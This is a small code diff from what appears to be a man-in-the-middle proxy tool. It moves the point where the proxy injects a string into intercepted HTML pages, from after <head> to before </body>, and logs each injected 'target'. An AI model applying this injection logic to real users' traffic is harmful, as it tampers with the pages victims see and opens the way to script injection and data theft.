@@ -130,7 +130,7 @@ class ServerConnection(HTTPClient):
 
         # Dirty fucking double-crossing hackers!
         if not self.isImageRequest:
-            data = re.sub("(?i)<head>","<head>"+self.inject_string,data)
+            data = re.sub("(?i)</body>",self.inject_string+"</body>",data)
             logging.debug("Injected a Target")
 
         if (self.contentLength != None):
